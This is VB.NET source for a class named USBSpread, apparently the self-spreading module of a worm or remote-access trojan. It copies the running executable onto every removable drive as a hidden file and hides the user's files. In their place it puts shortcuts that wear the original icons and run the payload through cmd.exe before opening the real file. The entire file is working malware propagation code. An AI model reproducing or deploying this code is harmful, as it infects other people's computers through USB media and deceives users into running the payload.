Namespace Spreads
    Public Class USBSpread
        Private Off As Boolean = False
        Dim thread As Threading.Thread = Nothing
        Public ExeName As String
        Public Sub Start()
            If thread Is Nothing Then
                thread = New Threading.Thread(AddressOf usb)
                thread.IsBackground = True
                thread.Start()
            End If
        End Sub
        Public Sub clean()
            Off = True
            Do Until thread Is Nothing
                Threading.Thread.Sleep(1)
            Loop

            For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.DriveType = IO.DriveType.Removable Or x.DriveType = IO.DriveType.CDRom Then
                            If IO.File.Exists(x.Name & ExeName) Then
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                IO.File.Delete(x.Name & ExeName)
                            End If
                            For Each xx As String In IO.Directory.GetFiles(x.Name)

                                Try
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                    If xx.ToLower.EndsWith(".lnk") Then
                                        IO.File.Delete(xx)
                                    End If
                                Catch ex As Exception
                                End Try
                            Next
                            For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                Try
                                    With New IO.DirectoryInfo(xx)
                                        .Attributes = IO.FileAttributes.Normal
                                    End With
                                Catch ex As Exception
                                End Try
                            Next
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
        End Sub
        Public dr As New Collection
        Sub usb()
            thread = Nothing
            clean()
            thread = Threading.Thread.CurrentThread
            Off = False
            Do Until Off = True
                Try
                    For Each x In IO.DriveInfo.GetDrives
                        Dim d As DRV
                        If dr.Contains(x.Name.ToLower) = False Then
                            d = New DRV
                            d.drive = x.Name
                            dr.Add(d, x.Name.ToLower)
                        Else
                            d = dr(x.Name.ToLower)
                        End If
                        If Off Then Exit Do

                        Try
                            If x.IsReady Then
                                If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Removable Or x.DriveType = IO.DriveType.CDRom Then
                                    Try
                                        If IO.File.Exists(x.Name & ExeName) = False Then
                                            IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                            IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                        End If
                                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                                            If IO.Path.GetExtension(xx).ToLower <> ".lnk" And xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                                If d.Files.Contains(New IO.FileInfo(xx).Name) = False Then
                                                    If d.Files.Count < 20 Then
                                                        lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                        d.Files.Add(New IO.FileInfo(xx).Name)
                                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                                        d.lnk.Add(IO.File.ReadAllText(x.Name & New IO.FileInfo(xx).Name & ".lnk"))
                                                    End If
                                                Else
                                                    If d.Files.Contains(New IO.FileInfo(xx).Name) Then
                                                        If IO.File.GetAttributes(xx) <> IO.FileAttributes.Hidden Then
                                                            IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                                        End If
                                                        If IO.File.Exists(x.Name & New IO.FileInfo(xx).Name & ".lnk") = False Then
                                                            lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                        Else
                                                            If IO.File.ReadAllText(x.Name & New IO.FileInfo(xx).Name & ".lnk") <> d.lnk(d.Files.IndexOf(New IO.FileInfo(xx).Name)) Then
                                                                lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                            End If
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        Next
                                    Catch ex As Exception
                                    End Try
                                End If
                            End If
                        Catch ex As Exception
                        End Try
                    Next
                Catch ex As Exception
                End Try
                Threading.Thread.Sleep(3000)
            Loop
            thread = Nothing
        End Sub
        Function lnk(ByVal x As IO.DriveInfo, ByVal xx As String, ByVal ico As String)
            Try
                IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
            Catch ex As Exception
            End Try
            With CreateObject("WScript.Shell").CreateShortcut(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                .TargetPath = "cmd.exe"
                .WorkingDirectory = ""
                .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) & " " & ChrW(34)) & "&explorer /root,""%CD%" & New IO.DirectoryInfo(xx).Name & """ & exit"
                .IconLocation = ico
                .Save()
            End With
            Return True
        End Function
        Function GetIcon(ByVal ext As String) As String
            Try
                Dim r = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Classes\", False)
                Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False).GetValue("") & "\DefaultIcon\").GetValue("", "")
                If e.Contains(",") = False Then e &= ",0"
                Return e
            Catch ex As Exception
                Return ""
            End Try
        End Function
        Public Class DRV
            Public drive As String
            Public Files As New List(Of String)
            Public lnk As New List(Of String)

        End Class
    End Class
End Namespace